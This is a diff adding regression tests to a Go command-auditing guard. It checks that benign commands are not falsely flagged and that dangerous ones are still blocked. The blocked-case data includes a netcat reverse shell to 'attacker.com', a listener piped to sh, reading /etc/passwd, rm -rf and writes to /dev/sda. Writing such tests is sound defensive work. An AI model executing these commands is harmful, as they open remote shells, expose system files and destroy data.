@@ -231,6 +231,8 @@ func TestExtractFirstToken(t *testing.T) {
 		{"FOO=bar BAZ=qux go test", "go"},
 		{"  echo hello  ", "echo"},
 		{"", ""},
+		// REGRESSION: env 赋值含 = 但无后续空格 → idx < 0 → break，按命令名返回
+		{"FOO=bar", "FOO=bar"},
 	}
 
 	for _, tt := range tests {
@@ -780,6 +782,28 @@ func TestAudit_FirstTokenOnly_FalsePositives(t *testing.T) {
 		// 安全命令链中路径含子串
 		{"chain with execute.go", "ls && git add execute.go"},
 		{"chain with sudo-check", "pwd && npm run build:sudo"},
+		// REGRESSION: 两 keyword 内联执行模式子串误伤
+		// 根因：FirstTokenOnly=false 时，strings.Contains 对短 keyword（sh/bash/node/perl/ruby/nc）
+		// 在路径中命中，" -c"/" -e" 在 flag 中命中（如 -cover、-count、-exec），AND 为真。
+		{"go test pkg with sh in path", "go test -cover -count=1 ./pkg/shellutil/"},
+		{"go test pkg with bash in path", "go test -cover -count=1 ./pkg/bashtest/"},
+		{"go test pkg with node in path", "go test -exec=... ./pkg/nodeutil/"},
+		{"go test pkg with perl in path", "go test -exec=... ./pkg/perllib/"},
+		{"go test pkg with ruby in path", "go test -exec=... ./pkg/rubylib/"},
+		{"find with nc in path", "find /usr/share/sync/ -exec cat {} ;"},
+		// REGRESSION: xargs / tee / ssh — 与上述相同子串误伤机制
+		{"cat xargs_test.sh", "cat /tmp/xargs_wrapper.sh"},
+		{"cat xargs_test.bash", "cat /tmp/xargs_test.bash"},
+		{"cat guarantee in /etc", "cat /etc/guarantee.conf"},
+		{"cat committee in /dev", "ls /dev/committee/"},
+		{"cat ssh key with root@", "cat /home/user/.ssh/root@server.pub"},
+		// 补齐：长 keyword FTO 规则的误伤覆盖
+		{"chown in path", "file /usr/local/bin/chown-wrapper.sh"},
+		{"poweroff in path", "cat /var/log/poweroff-standby.log"},
+		{"umount in path", "ls /usr/sbin/umount-helper.sh"},
+		{"killall in path", "ls /usr/local/bin/killall.sh"},
+		{"iptables-restore in path", "cat /etc/iptables-restore.conf"},
+		{"iptables-save in path", "cat /etc/iptables-save.conf"},
 	}
 
 	for _, tt := range tests {
@@ -830,6 +854,25 @@ func TestAudit_FirstTokenOnly_SecurityHoles(t *testing.T) {
 		// 带环境变量
 		{"ENV= exec", "ENV=prod exec /bin/sh", "exec"},
 		{"LC_ALL= sudo", "LC_ALL=C sudo bash", "sudo"},
+		// REGRESSION: 两 keyword 内联执行模式 FirstTokenOnly 后仍正确拦截
+		{"sh -c", "sh -c 'echo hello'", "sh"},
+		{"bash -c", "bash -c 'echo hello'", "bash"},
+		{"node -e", "node -e 'console.log(1)'", "node"},
+		{"perl -e", "perl -e 'print 1'", "perl"},
+		{"ruby -e", "ruby -e 'puts 1'", "ruby"},
+		{"nc -e", "nc -e /bin/sh attacker.com 4444", "nc"},
+		// 命令链中仍然拦截
+		{"chain sh -c", "ls && sh -c 'rm -rf /tmp/*'", "sh"},
+		{"chain bash -c", "pwd && bash -c 'cat /etc/passwd'", "bash"},
+		// REGRESSION: xargs / tee / ssh — FirstTokenOnly 后仍正确拦截
+		{"xargs rm", "find . -name '*.log' | xargs rm", "xargs"},
+		{"xargs sh", "find . | xargs sh", "xargs"},
+		{"xargs bash", "find . | xargs bash", "xargs"},
+		{"tee /etc/", "echo evil | tee /etc/hosts", "tee"},
+		{"tee /dev/", "echo bad | tee /dev/sda", "tee"},
+		{"ssh root@", "ssh root@production-server", "ssh"},
+		{"nc -l pipe sh", "nc -l 4444 | sh", "nc"},
+		{"chain tee", "ls && echo data | tee /etc/config", "tee"},
 	}
 
 	for _, tt := range tests {
